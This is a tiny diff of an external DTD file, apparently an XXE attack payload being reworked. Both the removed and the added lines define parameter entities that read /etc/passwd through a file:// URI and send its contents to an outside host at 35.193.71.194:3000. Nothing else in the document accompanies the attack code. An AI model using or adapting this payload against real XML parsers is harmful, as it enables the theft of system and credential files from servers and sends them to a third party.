@@ -1,4 +1,2 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://35.193.71.194:3000/?x=%file;'>">
-%eval;
-%exfiltrate;
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://35.193.71.194:3000/?%data;'>">
